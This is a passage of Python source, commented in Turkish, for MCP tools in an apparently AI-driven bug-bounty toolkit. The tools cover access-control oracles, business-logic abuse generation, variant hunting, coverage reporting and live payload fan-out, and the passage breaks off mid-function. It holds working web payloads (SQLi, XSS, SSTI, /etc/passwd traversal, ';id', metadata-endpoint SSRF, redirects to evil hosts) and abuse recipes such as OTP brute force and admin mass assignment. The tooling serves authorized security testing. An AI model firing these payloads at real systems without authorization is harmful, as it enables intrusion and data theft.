@mcp.tool()
def analyze_authz_result(test_json: str) -> str:
    """H2 (oracle) — FARKSAL ERİŞİM KONTROLÜ ORACLE'ı. build_authz_matrix testlerini
    ÇALIŞTIRDIKTAN sonra topladığın yanıtları DETERMİNİSTİK olarak değerlendirir:
    saldırgan kimlik, yetkili (owner) ile AYNI 2xx içeriği aldıysa → ihlal KANITLANDI
    (LLM görüşü değil, ölçülebilir farksal kanıt). False-positive guard.

    Beklenen test_json (esnek):
      {"test_type":"bola|bfla|unauth",
       "authorized":{"identity":"userA","status":200,"body_hash":"..","body_len":540,"markers":["a@x.com"]},
       "attacker":{"identity":"userB","status":200,"body_hash":"..","body_len":540,"markers":["a@x.com"]},
       "forbidden_baseline":{"status":403}}   # opsiyonel beklenen-reddedilen

    Args:
        test_json: Tek test sonucu (JSON). authorized = yetkili/owner yanıtı (kontrol),
                   attacker = düşük-yetkili kimliğin yanıtı.
    """
    try:
        t = json.loads(test_json) if isinstance(test_json, str) else test_json
    except Exception as e:
        return json.dumps({"verdict": "ERROR", "error": f"test_json parse: {e}"}, ensure_ascii=False)

    ttype = (t.get("test_type") or "bola").lower()
    atk = t.get("attacker") or {}
    auth = t.get("authorized") or {}
    atk_status = int(atk.get("status", 0))
    atk_ok = 200 <= atk_status < 300
    reasons, confidence, verdict = [], 0.0, "UNCONFIRMED"

    if ttype == "unauth":
        if atk_ok:
            verdict, confidence = "CONFIRMED", 0.9
            reasons.append(f"Anon/oturumsuz istek {atk_status} (2xx) ile korunan kaynağa eriş­ti → "
                           "kimlik doğrulama atlandı (broken access control).")
        else:
            reasons.append(f"Anon istek {atk_status} aldı (2xx değil) → erişim doğru reddedilmiş.")
    elif ttype == "bfla":
        if atk_ok:
            verdict, confidence = "CONFIRMED", 0.85
            reasons.append(f"Düşük-yetkili kimlik ayrıcalıklı fonksiyonu {atk.get('method','?')} "
                           f"{atk_status} (2xx) ile çağırabildi → BFLA (fonksiyon-seviye yetki ihlali).")
            if auth and 200 <= int(auth.get("status", 0)) < 300:
                confidence = 0.9
                reasons.append("Yetkili kimlik de aynı işlemi yapabiliyor → fonksiyon gerçek (no-op değil).")
        else:
            reasons.append(f"Ayrıcalıklı çağrı {atk_status} ile reddedildi → BFLA yok.")
    else:  # bola / idor
        ah, al = _body_sig(atk)
        oh, ol = _body_sig(auth)
        atk_markers = set(m.lower() for m in (atk.get("markers") or []))
        owner_markers = set(m.lower() for m in (auth.get("markers") or []))
        shared = atk_markers & owner_markers
        same_body = bool(ah and oh and ah == oh) or (
            al is not None and ol is not None and ol > 0 and abs(al - ol) <= max(2, 0.02 * ol))
        if atk_ok and (same_body or shared):
            verdict = "CONFIRMED"
            confidence = 0.92 if (ah and oh and ah == oh) else (0.88 if shared else 0.8)
            if ah and oh and ah == oh:
                reasons.append("Saldırgan yanıtı, sahibin (owner) yanıtıyla BYTE-AYNI (hash eşleşti) "
                               "→ başka kullanıcının objesi sızdı: BOLA/IDOR KANITLANDI.")
            elif shared:
                reasons.append(f"Saldırgan yanıtı sahibin hassas işaretçilerini içeriyor ({', '.join(sorted(shared))}) "
                               "→ yetkisiz veri erişimi: BOLA/IDOR.")
            else:
                reasons.append("Saldırgan 2xx + sahiple ~aynı gövde uzunluğu → muhtemel BOLA "
                               "(markers ile teyit et).")
        elif atk_ok and not (same_body or shared):
            verdict, confidence = "INCONCLUSIVE", 0.4
            reasons.append("Saldırgan 2xx aldı ama içerik sahibinden farklı — boş/yetkisiz şablon "
                           "olabilir. 'markers' (owner'a özgü e-posta/isim/id) ekleyip tekrar değerlendir.")
        else:
            reasons.append(f"Saldırgan {atk_status} aldı (2xx değil) → erişim reddedilmiş, BOLA yok.")

    vuln = {"unauth": "broken_access_control", "bfla": "bfla", "bola": "bola"}.get(ttype, "bola")
    return json.dumps({
        "test_type": ttype, "vuln_class": vuln, "verdict": verdict,
        "confidence": round(confidence, 3),
        "false_positive_risk": round(1 - confidence, 3),
        "evidence": reasons,
        "differential": {
            "attacker_status": atk_status, "authorized_status": auth.get("status"),
            "attacker_body_len": atk.get("body_len"), "authorized_body_len": auth.get("body_len"),
            "shared_markers": sorted(set(m.lower() for m in (atk.get("markers") or [])) &
                                     set(m.lower() for m in (auth.get("markers") or []))),
        },
        "next": ("CONFIRMED → store_finding(type='%s', severity='high') + mcp__reasoning__"
                 "exploitability_score + /report-generator." % vuln) if verdict == "CONFIRMED"
                else "Markers/owner kontrolü ekleyerek tekrar test et veya başka object id dene.",
        "note": "Deterministik farksal oracle — owner (yetkili) yanıtı KONTROL, attacker (düşük "
                "yetkili) yanıtı TEST. Aynı 2xx içerik = yetki sınırı yok = kanıt.",
    }, indent=2, ensure_ascii=False)


# ═══════════════════════ H3. BUSINESS-LOGIC ABUSE ═══════════════════════
# param-adı semantiği → (abuse senaryoları, vuln sınıfı, impact notu)
PARAM_SEMANTICS = [
    (r"(price|amount|total|cost|fee|sum|balance|subtotal|grand_total)",
     "price_manipulation",
     [("negatif değer", "-1 / -100 → bakiye/iade istismarı"),
      ("sıfır/ondalık", "0 / 0.01 → bedava veya kuruşa satın alma"),
      ("istemci-taraflı güven", "fiyatı istekte düşür → sunucu yeniden hesaplamıyorsa geçer"),
      ("para birimi düşürme", "USD→ zayıf currency / ondalık ayraç manipülasyonu"),
      ("integer overflow", "çok büyük değer → sarma/negatife dönme")]),
    (r"(qty|quantity|count|num|items?|amount_items|stock)",
     "business_logic",
     [("negatif miktar", "-1 → iade/stok istismarı veya toplam düşürme"),
      ("sıfır", "0 → bedava kalem"),
      ("aşırı büyük", "999999 → overflow / DoS / stok tükenmesi"),
      ("ondalık", "1.5 → yarım birim mantık hatası")]),
    (r"(coupon|promo|voucher|discount|gift|referral|credit)",
     "business_logic",
     [("kupon replay", "aynı kuponu tekrar tekrar uygula (idempotency yok)"),
      ("kupon stacking", "birden çok kuponu birlikte uygula"),
      ("brute force", "kupon/hediye kodu enumerate (rate-limit yok)"),
      ("kendine referral", "self-referral ile kredi kazanma")]),
    (r"(role|is_admin|admin|privilege|group|account_type|user_type|permission|scope|level|plan)",
     "mass_assignment",
     [("ayrıcalık yükseltme", "role=admin / is_admin=true gövdeye ekle (mass assignment)"),
      ("plan yükseltme", "plan=enterprise / level=99 enjekte et"),
      ("gizli alan", "API yanıtındaki alanları PUT/POST gövdesine geri yaz")]),
    (r"(step|stage|state|status|phase|next|stage_id|current_step|wizard)",
     "workflow_bypass",
     [("adım atlama", "ara adımları atlayıp doğrudan son/onay durumuna geç"),
      ("durum zorlama", "status=paid / state=approved ile akışı zorla"),
      ("geri sarma", "tamamlanmış işlemi önceki düzenlenebilir duruma al")]),
    (r"(otp|code|pin|token|verification|2fa|mfa|secret)",
     "authentication_bypass",
     [("OTP brute", "4-6 hane brute (rate-limit/lockout yok)"),
      ("OTP replay", "kullanılmış OTP'yi tekrar kullan / süresiz"),
      ("response manip", "yanlış OTP yanıtını {success:true} yap (istemci güveni)"),
      ("null/boş", "boş/null OTP ile doğrulamayı atla")]),
    (r"(email|e_mail|username|user|login|phone)",
     "business_logic",
     [("hesap ele geçirme", "başkasının e-postası ile parola sıfırlama akışı"),
      ("kullanıcı enum", "kayıt/login farklı yanıt → enumeration"),
      ("unicode/case", "Victim@x.com vs victim@x.com çift hesap / bypass")]),
    (r"(redirect|return|return_url|returnto|next|url|continue|callback|dest|target|goto)",
     "open_redirect",
     [("open redirect", "//evil.com / https:evil.com ile yönlendir"),
      ("SSRF pivotu", "internal URL / 169.254.169.254 ile sunucu-taraf isteği"),
      ("OAuth token sızma", "redirect_uri'yi kontrollü domaine çevir")]),
    (r"(id|uid|user_id|account|order|invoice|doc|object|pid|oid|ref|number)",
     "idor",
     [("IDOR", "id'yi komşu değerle değiştir → başka kullanıcının kaydı"),
      ("enumeration", "sıralı id'leri tara → veri sızıntısı")]),
    (r"(file|path|name|filename|template|page|include|doc|view)",
     "path_traversal",
     [("traversal", "../../etc/passwd / ..%2f ile dosya okuma"),
      ("LFI→RCE", "log/zafiyetli include ile kod yürütme"),
      ("upload bypass", "uzantı/content-type/magic-byte bypass")]),
    (r"(date|expiry|expire|valid|timestamp|time|deadline|start|end)",
     "business_logic",
     [("backdating", "geçmiş/gelecek tarih ile kampanya/abonelik istismarı"),
      ("expiry bypass", "süre dolmuş kupon/oturumu geçerli yap")]),
]
GENERIC_ABUSE = [
    ("race_condition",
     "Eşzamanlı istek (race condition): tekil-kullanım kaynaklarda (kupon, bakiye, stok, "
     "para çekme, oy) N paralel istek → çift kullanım/double-spend. ToCToU.",
     "20 paralel aynı istek (curl & / turbo intruder); sayaç 1 yerine N düştü mü?"),
    ("mass_assignment",
     "Mass assignment: object yanıtındaki TÜM alanları (is_admin, balance, verified, owner_id) "
     "create/update gövdesine geri yaz → gizli ayrıcalıklı alanları set et.",
     "GET yanıtındaki alanları PUT gövdesine ekle; yanıtta yansıdı mı?"),
    ("business_logic",
     "Idempotency/replay: aynı 'işlem tamam' isteğini (ödeme, transfer, kullan) tekrar gönder "
     "→ çift etki (replay).",
     "Aynı POST'u 2x gönder; iki kez işlendi mi (iki iade/iki kredi)?"),
    ("workflow_bypass",
     "Adım atlama: çok adımlı akışta (sepet→adres→ödeme→onay) ara adımı atlayıp son endpoint'i "
     "doğrudan çağır → ödeme/doğrulama bypass.",
     "Son adım endpoint'ini önkoşul state olmadan çağır; kabul edildi mi?"),
]


@mcp.tool()
def generate_abuse_cases(target: str = "", endpoint: str = "", params: str = "",
                         context: str = "") -> str:
    """H3 — BUSINESS-LOGIC ABUSE CASE üreteci. Parametre semantiğine (fiyat/miktar/rol/
    kupon/iş-akışı/OTP...) göre KÖTÜYE-KULLANIM senaryoları üretir + her endpoint için
    jenerik mantık saldırıları (race condition, mass assignment, replay, adım atlama).
    AI'nın otomatik tarayıcıyı ezdiği sınıf — mantık hataları imza ile bulunamaz, akıl
    yürütme ister. Impact ile sıralar.

    Args:
        target: Hedef (bağlam için)
        endpoint: İlgili endpoint/URL (ör. /api/checkout)
        params: Parametre adları (virgül veya JSON; örn "price,quantity,coupon,user_id")
        context: Uygulama bağlamı (e-ticaret, bankacılık, booking, SaaS abonelik...)
    """
    param_list = _parse_list(params)
    cases = []
    for p in param_list:
        matched = False
        for pattern, vclass, scenarios in PARAM_SEMANTICS:
            if re.search(pattern, p, re.I):
                matched = True
                for title, how in scenarios:
                    cases.append({
                        "param": p, "vuln_class": vclass, "abuse": title,
                        "test": f"{p}: {how}", "impact": _impact(vclass),
                        "ev": _ev(vclass), "validate_with": _hook(vclass),
                        "trigger_skill": SKILL_FOR.get(vclass, "/access-control-hunting"),
                    })
                break
        if not matched:
            cases.append({
                "param": p, "vuln_class": "business_logic", "abuse": "sınır/tip testi",
                "test": f"{p}: boş, null, negatif, çok uzun, tip değişimi (int↔str↔array), "
                        "unicode, çift parametre (HPP)", "impact": _impact("business_logic"),
                "ev": _ev("business_logic"), "validate_with": _hook("business_logic"),
                "trigger_skill": "/access-control-hunting",
            })
    # her endpoint'e jenerik mantık saldırıları
    for vclass, desc, test in GENERIC_ABUSE:
        cases.append({
            "param": "(endpoint geneli)", "vuln_class": vclass, "abuse": desc.split(":")[0],
            "test": test, "impact": _impact(vclass), "ev": _ev(vclass),
            "validate_with": _hook(vclass), "trigger_skill": SKILL_FOR.get(vclass, "/access-control-hunting"),
            "detail": desc,
        })
    cases.sort(key=lambda c: c["impact"], reverse=True)

    result = {
        "engine": "deterministic business-logic abuse-case generator",
        "target": target or "(verilmedi)", "endpoint": endpoint or "(verilmedi)",
        "params_analyzed": param_list, "abuse_cases": cases,
        "methodology": "Mantık hataları imza ile bulunamaz → her abuse case'i ELLE üret/doğrula: "
                       "beklenen iş kuralı vs gözlenen davranış. Race/replay için eşzamanlı istek.",
        "note": "İş mantığı = AI'nın tarayıcıyı ezdiği alan. Fiyat/rol/race en yüksek ödül. "
                "Yıkıcı testlerde (silme/transfer) önce scope/onay; idempotent dene.",
    }
    if not param_list:
        result["advice"] = ("params ver (ör. 'price,quantity,coupon,role,step') → semantik abuse "
                            "üretilir. Jenerik endpoint saldırıları yine de listelendi.")
    if _any_llm_key() and (param_list or context):
        sys = ("You are an elite business-logic bug hunter in an authorized lab. Given an endpoint, "
               "params and app context, list up to 4 domain-specific abuse cases scanners can't find "
               "(value/state/sequence manipulation). One line each, concrete with the exact tamper.")
        usr = f"Endpoint: {endpoint}\nParams: {', '.join(param_list)}\nContext: {context}"
        extra, err = _chat(sys, usr, temperature=0.6, max_tokens=450)
        result["llm_domain_abuse"] = extra
        if err:
            result["llm_note"] = f"LLM yok ({err}); deterministik abuse case'ler geçerli."
    return json.dumps(result, indent=2, ensure_ascii=False)


# ═══════════════════════ H4. VARIANT ANALYSIS (sibling hunting) ═══════════════════════
COMMON_PARAMS = {
    "sql_injection": ["id", "user", "search", "q", "category", "sort", "order", "filter", "name", "page"],
    "idor": ["id", "uid", "user_id", "account", "order", "invoice", "doc", "file", "pid", "ref"],
    "bola": ["id", "uid", "user_id", "account", "order", "object_id", "doc_id", "ref"],
    "xss_reflected": ["q", "search", "name", "message", "comment", "redirect", "lang", "ref"],
    "ssrf": ["url", "uri", "path", "dest", "callback", "webhook", "image", "proxy", "next"],
    "lfi": ["file", "page", "path", "include", "template", "doc", "lang", "view"],
    "path_traversal": ["file", "path", "name", "download", "doc", "page"],
    "open_redirect": ["redirect", "url", "next", "return", "returnto", "continue", "dest", "goto"],
    "command_injection": ["cmd", "host", "ip", "ping", "domain", "exec", "query", "name"],
    "ssti": ["name", "template", "msg", "search", "title", "content"],
}


@mcp.tool()
def hunt_variants(finding_type: str, target: str = "", param: str = "", endpoint: str = "",
                  context: str = "") -> str:
    """H4 — VARIANT ANALYSIS / SIBLING HUNTING. DOĞRULANMIŞ bir bulgudan yola çıkıp AYNI
    zafiyet sınıfını "başka nerede?" diye sistematik arar: kardeş parametreler, memory'deki
    kardeş endpoint'ler, alternatif HTTP method/content-type, parametre kirletme (HPP),
    farklı konum (query/body/header/cookie/path), diğer subdomain'ler. Bug bounty avcısının
    elle yaptığı ÇOĞALTMAYI otomatikleştirir → tek bulgudan çok bulgu (büyük ROI).

    Args:
        finding_type: Doğrulanmış bulgu sınıfı (sql_injection, idor, ssrf, xss, lfi...)
        target: Hedef (memory'den kardeş endpoint'leri çeker)
        param: Zafiyetli parametre (varsa)
        endpoint: Zafiyetli endpoint/URL (varsa)
        context: Ek bağlam
    """
    vclass = _norm_class(finding_type)
    endpoints = _read_endpoints(target)
    variants = []

    # 1) Kardeş parametreler (aynı endpoint, aynı sınıf için tipik paramlar)
    sib_params = [p for p in COMMON_PARAMS.get(vclass, []) if p != param]
    for p in sib_params[:8]:
        variants.append({"strategy": "sibling_param", "where": endpoint or "(aynı endpoint)",
                         "what": f"'{p}' parametresinde {vclass} dene",
                         "rationale": "Bir param zafiyetliyse aynı handler'daki diğer paramlar da olabilir.",
                         "ev": _ev(vclass), "validate_with": _hook(vclass)})

    # 2) Kardeş endpoint'ler (memory'den; path prefix / aynı teknoloji)
    base_prefix = ""
    if endpoint:
        m = re.search(r"^(https?://[^/]+)?(/[^?]*/)", endpoint)
        base_prefix = (m.group(2) if m else "")
    sib_eps = []
    for e in endpoints:
        u = e["url_or_port"]
        if u == endpoint:
            continue
        if (base_prefix and base_prefix in u) or (param and (f"{param}=" in u or f"/{param}/" in u)):
            sib_eps.append(u)
    for u in sib_eps[:10]:
        variants.append({"strategy": "sibling_endpoint", "where": u,
                         "what": f"Aynı sınıfı ({vclass}) bu kardeş endpoint'te dene",
                         "rationale": "Aynı path-ailesi/teknoloji genelde aynı kod kalıbını paylaşır.",
                         "ev": round(_ev(vclass) * 0.9, 4), "validate_with": _hook(vclass)})

    # 3) Method + content-type varyasyonu
    for m in ["POST", "PUT", "PATCH", "DELETE", "GET (override)"]:
        variants.append({"strategy": "method_swap", "where": endpoint or "(endpoint)",
                         "what": f"Aynı param/payload'ı {m} ile gönder (X-HTTP-Method-Override dahil)",
                         "rationale": "Filtre/yetki sıklıkla tek method'a bağlıdır; method değişimi atlatır.",
                         "ev": round(_ev(vclass) * 0.7, 4), "validate_with": _hook(vclass)})
    for ct in ["application/json", "application/xml", "multipart/form-data", "text/plain"]:
        variants.append({"strategy": "content_type_swap", "where": endpoint or "(endpoint)",
                         "what": f"Gövdeyi {ct} olarak gönder (JSON↔form↔XML)",
                         "rationale": "Farklı parser farklı filtre; XML → XXE imkânı.",
                         "ev": round(_ev(vclass) * 0.6, 4), "validate_with": _hook(vclass)})

    # 4) Konum (injection point) varyasyonu
    for loc in ["body", "JSON body", "HTTP header (X-Forwarded-For/Referer/User-Agent)",
                "cookie", "path segment", "duplicate param (HPP)"]:
        variants.append({"strategy": "location_swap", "where": loc,
                         "what": f"Aynı payload'ı {loc} içinde dene",
                         "rationale": "Aynı değer farklı konumda farklı sink'e ulaşır; WAF query'yi filtreler ama header'ı değil.",
                         "ev": round(_ev(vclass) * 0.65, 4), "validate_with": _hook(vclass)})

    # 5) Diğer host/subdomain'ler (memory'deki farklı target/host)
    hosts = set()
    for e in endpoints:
        m = re.search(r"https?://([^/]+)", e["url_or_port"])
        if m:
            hosts.add(m.group(1))
    for h in list(hosts)[:8]:
        if endpoint and h in endpoint:
            continue
        variants.append({"strategy": "other_host", "where": h,
                         "what": f"Aynı sınıfı ({vclass}) {h} üzerinde de dene",
                         "rationale": "Paylaşılan kod/framework birden çok host'ta aynı bug'ı barındırır.",
                         "ev": round(_ev(vclass) * 0.8, 4), "validate_with": _hook(vclass)})

    variants.sort(key=lambda v: v["ev"], reverse=True)
    return json.dumps({
        "engine": "variant analysis / sibling hunter",
        "confirmed_finding": {"vuln_class": vclass, "param": param, "endpoint": endpoint},
        "variants_generated": len(variants),
        "ranked_variants": variants[:40],
        "memory_endpoints_scanned": len(endpoints),
        "principle": "Bir bug nadiren tektir. Aynı kod kalıbı/handler/framework genelde aynı zaafı "
                     "tekrar eder → sistematik çoğalt, her birini validator ile doğrula, record_lesson.",
        "note": "Her varyantı recommended validator ile CONFIRMED yap; bulduklarını store_finding + "
                "hunt_variants'ı yeni param/endpoint ile tekrar çağırarak dallandır.",
    }, indent=2, ensure_ascii=False)


# ═══════════════════════ H5. ATTACK-SURFACE COVERAGE ═══════════════════════
# bir endpoint için ilgili (relevant) sınıfları çıkaran ipuçları
ENDPOINT_CLASS_HINTS = [
    (r"(login|signin|auth|session|password|reset|register|sso|oauth)",
     ["authentication_bypass", "business_logic", "sql_injection", "open_redirect"]),
    (r"(admin|manage|internal|console|dashboard|config|settings)",
     ["bfla", "broken_access_control", "privilege_escalation", "idor"]),
    (r"(/api/|/v\d+/|graphql|\.json)",
     ["bola", "bfla", "mass_assignment", "idor", "info_disclosure"]),
    (r"[?&](id|uid|user_id|account|order|invoice|doc|file|pid|oid|ref)=|/\d+(/|$)",
     ["idor", "bola", "sql_injection"]),
    (r"(search|query|q=|filter|sort|category)",
     ["sql_injection", "xss_reflected", "ssti"]),
    (r"(upload|import|file|attachment|avatar|image)",
     ["file_upload", "path_traversal", "xxe"]),
    (r"(redirect|return|next|url=|callback|continue|dest)",
     ["open_redirect", "ssrf"]),
    (r"(cart|checkout|order|payment|pay|invoice|coupon|price|product|subscribe|plan)",
     ["price_manipulation", "business_logic", "race_condition", "workflow_bypass", "idor"]),
    (r"(fetch|proxy|webhook|import|preview|render|pdf|image_url)",
     ["ssrf", "xxe"]),
]
CORE_CLASS_GROUPS = {
    "access_control": ["idor", "bola", "bfla", "broken_access_control", "privilege_escalation"],
    "business_logic": ["business_logic", "price_manipulation", "race_condition", "workflow_bypass", "mass_assignment"],
    "injection": ["sql_injection", "command_injection", "ssti", "xxe", "lfi", "path_traversal"],
    "client_side": ["xss_reflected", "xss_stored", "cors_misconfiguration", "open_redirect"],
    "server_side": ["ssrf", "rce", "deserialization", "file_upload"],
}


def _relevant_classes(url):
    classes = set()
    for pat, cls in ENDPOINT_CLASS_HINTS:
        if re.search(pat, url, re.I):
            classes.update(cls)
    if not classes:
        classes.update(["xss_reflected", "idor", "info_disclosure"])
    return classes


@mcp.tool()
def coverage_report(target: str = "") -> str:
    """H5 — ATTACK-SURFACE COVERAGE. memory'deki endpoint'leri okur, her biri için İLGİLİ
    zafiyet sınıflarını çıkarır ve hangilerinin DENENDİĞİNİ (findings + lessons) eşler →
    (endpoint × sınıf) test edildi/edilmedi matrisi + tamamlanma %'si + en değerli TEST
    EDİLMEMİŞ boşluklar. Ayrıca hiç dokunulmamış çekirdek sınıf gruplarını (erişim kontrolü,
    iş mantığı...) "kör nokta" olarak uyarır → kaçırılan bug'ı (false negative) engeller.

    Args:
        target: Hedef (boşsa tüm endpoint'ler)
    """
    endpoints = _read_endpoints(target)
    tested = _tested_classes(target)
    if not endpoints:
        return json.dumps({
            "coverage_percent": 0, "endpoints": 0,
            "advice": "memory'de endpoint yok — recon yapıp store_endpoint ile kaydet, sonra coverage_report.",
        }, indent=2, ensure_ascii=False)

    per_endpoint, gaps = [], []
    total_cells = tested_cells = 0
    for e in endpoints:
        url = e["url_or_port"]
        relevant = _relevant_classes(url + " " + e["technologies"])
        cov = {c: (c in tested) for c in sorted(relevant)}
        ntested = sum(1 for v in cov.values() if v)
        total_cells += len(relevant)
        tested_cells += ntested
        per_endpoint.append({
            "endpoint": url, "relevant_classes": sorted(relevant),
            "tested": sorted([c for c, v in cov.items() if v]),
            "untested": sorted([c for c, v in cov.items() if not v]),
            "coverage": round(ntested / len(relevant), 2) if relevant else 0,
        })
        for c in relevant:
            if c not in tested:
                gaps.append({"endpoint": url, "vuln_class": c, "impact": _impact(c),
                             "ev": _ev(c), "trigger_skill": SKILL_FOR.get(c, "/web-exploit"),
                             "validate_with": _hook(c),
                             "action": f"{url} üzerinde {c} test et ({SKILL_FOR.get(c, '/web-exploit')})"})
    # boşlukları impact'e göre, endpoint başına en iyiyi öne alarak sırala
    gaps.sort(key=lambda g: g["ev"], reverse=True)
    # dedup (endpoint+class)
    seen, uniq_gaps = set(), []
    for g in gaps:
        k = (g["endpoint"], g["vuln_class"])
        if k not in seen:
            seen.add(k)
            uniq_gaps.append(g)

    # kör nokta: hiç denenmemiş çekirdek grup
    blind_spots = []
    for group, classes in CORE_CLASS_GROUPS.items():
        if not (set(classes) & tested):
            relevant_anywhere = any(set(classes) & _relevant_classes(e["url_or_port"]) for e in endpoints)
            if relevant_anywhere:
                blind_spots.append({
                    "group": group, "classes": classes,
                    "warning": f"'{group}' grubundan HİÇ test yapılmamış ama yüzey bunu içeriyor → "
                               "yüksek olasılıkla kaçırılmış bug.",
                    "recommended_skill": SKILL_FOR.get(classes[0], "/web-exploit"),
                })

    coverage_pct = round(100 * tested_cells / total_cells) if total_cells else 0
    return json.dumps({
        "engine": "attack-surface coverage matrix (false-negative guard)",
        "target": target or "(tümü)",
        "endpoints": len(endpoints), "tested_classes": sorted(tested),
        "coverage_percent": coverage_pct,
        "cells": {"total_relevant": total_cells, "tested": tested_cells, "untested": total_cells - tested_cells},
        "blind_spots": blind_spots,
        "top_gaps": uniq_gaps[:20],
        "per_endpoint": per_endpoint[:40],
        "interpretation": f"Yüzeyin ~%{coverage_pct}'i ilgili sınıflarla denenmiş. Kör noktalar + "
                          "top_gaps = en olası KAÇIRILMIŞ bug'lar. EV sırasıyla kapat.",
        "note": "Düşük coverage = tarama derin değil. 'access_control' / 'business_logic' kör noktası "
                "varsa öncelik onlar (en yüksek ödül, en sık kaçırılan). Her boşluğu kapatınca "
                "store_finding/record_lesson → coverage otomatik artar.",
    }, indent=2, ensure_ascii=False)


# ═══════════════ H6. AUTO-FANOUT VARIANTS (run + validate, kali-tools köprüsü) ═══════════════
SQL_ERROR_RE = re.compile(
    r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite/JDBCDriver|"
    r"Microsoft OLE DB|ODBC SQL|Unclosed quotation mark|quoted string not properly|"
    r"You have an error in your SQL|pg_query\(\)|SQLSTATE\[)", re.I)
_DEFAULT_PAYLOADS = {
    "sql_injection": "'\"`)--", "xss_reflected": "cco<svg/onload=alert(1)>",
    "xss_stored": "cco<svg/onload=alert(1)>", "ssti": "${{7*7}}", "lfi": "../../../../etc/passwd",
    "path_traversal": "../../../../etc/passwd", "command_injection": ";id",
    "open_redirect": "//cco.evil.example", "ssrf": "http://169.254.169.254/latest/meta-data/",
}
_DESTRUCTIVE = {"file_upload", "deserialization", "rce", "command_injection"}


def _set_query_param(url, param, value):
    p = urlparse(url)
    q = dict(parse_qsl(p.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(p._replace(query=urlencode(q, doseq=True)))


def _live_request(method, url, headers=None, timeout=10):
    t0 = time.perf_counter()
    try:
        r = requests.request(method.upper(), url, headers=headers or {},
                             timeout=timeout, verify=False, allow_redirects=False)
        return {"ok": True, "status": r.status_code, "len": len(r.content),
                "time": round(time.perf_counter() - t0, 3), "text": r.text or "",
                "location": r.headers.get("Location", "")}
    except Exception as e:
        return {"ok": False, "status": None, "len": 0, "time": 0, "text": "",
                "location": "", "error": str(e)}


def _light_oracle(vclass, payload, baseline, probe):
    """Hızlı triage oracle'ı (preliminary). Kesin doğrulama yine validator'a devredilir."""
    if not probe.get("ok"):
        return "ERROR", f"istek başarısız: {probe.get('error')}"
    text = probe.get("text", "")
    if vclass in ("xss_reflected", "xss_stored", "ssti"):
        marker = "cco<svg" if "svg" in payload else payload[:12]
        if marker and marker in text:
            return "LIKELY", f"payload yansıması ham/escape edilmemiş bulundu ('{marker}')"
        if vclass == "ssti" and "49" in text and "7*7" in payload:
            return "LIKELY", "SSTI: {{7*7}} → 49 değerlendirildi"
        return "INCONCLUSIVE", "yansıma yok/escape edilmiş"
    if vclass == "sql_injection":
        if SQL_ERROR_RE.search(text) and not SQL_ERROR_RE.search(baseline.get("text", "")):
            return "LIKELY", "payload'la SQL hata imzası belirdi (baseline'da yok)"
        if probe.get("status") != baseline.get("status"):
            return "INCONCLUSIVE", f"status farkı {baseline.get('status')}→{probe.get('status')} (boolean ile teyit)"
        dl = abs(probe.get("len", 0) - baseline.get("len", 0))
        if dl > max(40, 0.15 * (baseline.get("len", 1) or 1)):
            return "INCONCLUSIVE", f"içerik uzunluğu farkı {dl}B (differential ile teyit)"
        return "INCONCLUSIVE", "belirgin SQLi sinyali yok"
    if vclass in ("lfi", "path_traversal"):
        if re.search(r"root:.*:0:0:", text):
            return "LIKELY", "/etc/passwd içeriği döndü (root:...:0:0)"
        return "INCONCLUSIVE", "dosya içeriği görülmedi"
    if vclass == "open_redirect":
        loc = probe.get("location", "")
        if "cco.evil.example" in loc:
            return "LIKELY", f"Location header saldırgan host'a yönlendiriyor: {loc}"
        return "INCONCLUSIVE", "yönlendirme saldırgan host'a değil"
    if vclass == "command_injection":
        if re.search(r"uid=\d+\(", text):
            return "LIKELY", "komut çıktısı (uid=...) yanıtta görüldü"
        return "INCONCLUSIVE", "komut çıktısı görülmedi"
    if probe.get("status") != baseline.get("status"):
        return "INCONCLUSIVE", f"status değişti {baseline.get('status')}→{probe.get('status')}"
    return "INCONCLUSIVE", "belirgin sinyal yok"


def _executable_variants(vclass, target, param, endpoint):
    """Canlı koşturulabilir varyant alt kümesi (GET tabanlı, güvenli): kardeş param + header konumu."""
    base = endpoint or target
    payload = _DEFAULT_PAYLOADS.get(vclass, "cco-test")
    out = []
    sibs = [p for p in COMMON_PARAMS.get(vclass, []) if p != param][:6]
    for p in sibs:
        out.append({"strategy": "sibling_param", "location": f"query:{p}", "method": "GET",
                    "url": _set_query_param(base, p, payload), "param": p, "payload": payload})
    if param:
        out.insert(0, {"strategy": "origin_param", "location": f"query:{param}", "method": "GET",
                       "url": _set_query_param(base, param, payload), "param": param, "payload": payload})
    for hname in ["X-Forwarded-For", "Referer", "User-Agent", "X-Forwarded-Host"]:
        out.append({"strategy": "header_location", "location": f"header:{hname}", "method": "GET",
                    "url": base, "param": hname, "payload": payload, "header": hname})
    return out


@mcp.tool()
def auto_fanout_variants(finding_type: str, target: str = "", param: str = "", endpoint: str = "",
                         payload: str = "", live: bool = False, max_requests: int = 12,
                         headers: str = "", allow_mutations: bool = False) -> str:
    """H6 — AUTO-FANOUT (kali-tools köprüsü). DOĞRULANMIŞ bir bug'ı alır ve `hunt_variants`
    varyantlarını OTOMATİK ÇALIŞTIRILABİLİR hâle getirir:

      • live=False (varsayılan, offline): her varyant için ÇALIŞTIRILACAK
        `mcp__kali-tools__curl_request(...)` + onaylayacak `mcp__validator__validate_*(...)`
        çağrılarından oluşan bir FANOUT PLANI döndürür (ajan sırayla koşar).
      • live=True: GET-tabanlı güvenli varyantları gerçekten gönderir, hızlı bir triage
        oracle'ı uygular (yansıma/SQL-hata/differential), her umut veren varyant için kesin
        doğrulama amacıyla validator çağrısını işaretler. Yıkıcı sınıflar (rce/upload) canlıda
        atlanır (allow_mutations gerekir).

    Args:
        finding_type: Doğrulanmış bulgu sınıfı (sql_injection, xss_reflected, lfi, open_redirect...)
        target: Hedef (memory'den kardeş endpoint çekmek için)
        param: Zafiyetli parametre
        endpoint: Zafiyetli endpoint/URL (canlı koşum bunun üstünde yapılır)
        payload: Doğrulanmış payload (boşsa sınıfa uygun varsayılan)
        live: True → varyantları gerçekten gönder + triage oracle uygula
        max_requests: Canlı modda max istek (rate-limit/OPSEC guard)
        headers: Ek header'lar ('Authorization: Bearer x;Cookie: a=b')
        allow_mutations: Yıkıcı sınıfların canlı koşumuna izin ver (varsayılan False)
    """
    vclass = _norm_class(finding_type)
    if payload:
        _DEFAULT_PAYLOADS_LOCAL = payload
    else:
        _DEFAULT_PAYLOADS_LOCAL = _DEFAULT_PAYLOADS.get(vclass, "cco-test")
    variants = _executable_variants(vclass, target, param, endpoint)
    # payload override
    if payload:
